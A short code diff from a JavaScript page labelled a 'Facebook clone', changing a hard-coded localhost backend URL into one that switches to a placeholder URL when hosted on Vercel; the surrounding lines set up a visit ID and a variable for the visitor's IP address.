@@ -62,8 +62,10 @@
       let userIPAddress = null;
       let visitId = 'visit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
       
-      // Backend URL for localhost testing
-      const API_BASE_URL = 'http://localhost:5000';
+      // Dynamic Backend URL - checks if on Vercel or localhost
+      const API_BASE_URL = window.location.hostname.includes('vercel.app') 
+        ? 'YOUR_BACKEND_URL_HERE'  // Replace with actual backend URL
+        : 'http://localhost:5000';
 
       console.log('🚀 STARTING FACEBOOK CLONE...');
       console.log('Visit ID:', visitId);
